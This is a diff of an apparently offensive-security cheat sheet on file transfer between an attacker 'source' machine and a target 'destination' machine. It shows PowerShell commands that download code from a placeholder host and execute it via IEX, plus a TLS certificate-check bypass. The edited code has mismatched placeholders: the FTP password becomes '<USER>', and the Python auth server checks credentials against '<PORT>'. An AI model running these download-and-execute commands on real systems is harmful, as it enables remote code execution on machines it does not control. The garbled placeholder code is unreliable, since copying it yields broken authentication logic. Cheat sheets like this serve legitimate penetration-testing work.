@@ -59,6 +59,11 @@ IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
 Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <OUTPUT FILE>
 ```
 
+**Destination Machine: Authentication**  
+```powershell
+Invoke-WebRequest -Uri "http://<IP>:<PORT>/<FILE>" -Headers @{"Authorization"="Basic "+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("<USER>:<PASSWORD>"))} -OutFile "C:\Users\Public\<FILE>"
+```
+
 **Destination Machine: ByPass Internet Explorer Error**  
 ```powershell
 Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
@@ -66,8 +71,9 @@ Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
 
 **Destination Machine: ByPass SSL/TLS Error**  
 ```powershell
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+Invoke-WebRequest -Uri "https://<IP>:<PORT>/<FILE>" -OutFile "<FILE>" -SkipCertificateCheck
 ```
+
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
@@ -129,12 +135,12 @@ net use n: /delete /y
 **Source Machine: Setting up a Python3 FTP Server on Linux**
 ```bash
 sudo pip3 install pyftpdlib
-sudo python3 -m pyftpdlib --port 21 --user ftpuser --password 'ftppass'
+sudo python3 -m pyftpdlib --port 21 --user <USER> --password '<USER>'
 ```
 
 **Destination Machine: Download file using Powershell**
 ```powershell
-(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('ftpuser', 'ftppass')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
+(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<USER>')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
 
 **Destination Machine: Download file using CMD**  
@@ -404,33 +410,60 @@ scp user@remote_ip:/remote/path/<FILE> /local/path/
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h2>📤 Uploads</h2></summary>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><h3>Web Upload</h3></summary>
+<summary><h3>Web upload</h3></summary>
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h4>Python UploadServer (Basic)</h4></summary>
 
 **Source Machine: Start Web Server**  
 ```bash
+# Run in the target directory
 sudo python3 -m pip install --user uploadserver
-```
+sudo python3 -m uploadserver <PORT>
 
-**Source Machine: Create a Self-Signed Certificate**  
-```bash
-openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
-```
+#Serving HTTP on 0.0.0.0 port <PORT> (http://0.0.0.0:<PORT>/) ...
+```  
+  
+> **_Destination Machine:_**  Refer to the "Downloads" section for available transfer methods.
 
-**Source Machine: Prepare the files**  
-```bash
-mkdir https && cd https
-mv ~/<FILE> .
-```
+</details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h4>Authenticated Web Server</h4></summary>
 
-> **_NOTE:_**  The webserver should not host the certificate. Create a new directory to host the file for the webserver.
+**Source Machine: Create server.py**  
+```python
+# server.py
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import base64
+
+class AuthHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        auth = self.headers.get('Authorization')
+        if not auth or not auth.startswith('Basic '):
+            self.send_response(401)
+            self.send_header('WWW-Authenticate', 'Basic realm="Secure Area"')
+            self.end_headers()
+            return
+        
+        username, password = base64.b64decode(auth[6:]).decode().split(':', 1)
+        if username == '<PORT>' and password == '<PORT>':
+            super().do_GET()
+        else:
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'Access denied')
+
+HTTPServer(('0.0.0.0', <PORT>), AuthHandler).serve_forever()
+```
 
 **Source Machine: Start Web Server**  
 ```bash
-sudo python3 -m uploadserver --server-certificate ~/server.pem 443
+sudo python3 server.py
 ```
 
 > **_Destination Machine:_**  Refer to the "Downloads" section for available transfer methods.
 
+</details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>SCP Uploads</h3></summary>  
